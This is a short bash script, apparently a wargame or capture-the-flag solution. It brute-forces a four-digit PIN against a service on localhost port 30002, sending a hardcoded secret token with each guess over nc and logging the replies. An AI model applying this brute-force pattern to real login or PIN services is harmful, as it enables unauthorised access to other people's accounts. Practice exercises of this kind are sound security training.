#!/bin/bash

for i in {9999..0000}
do
        echo "Trying combination $i"
        echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i" | timeout 0.6s  nc localhost 30002 >> inf.txt
done
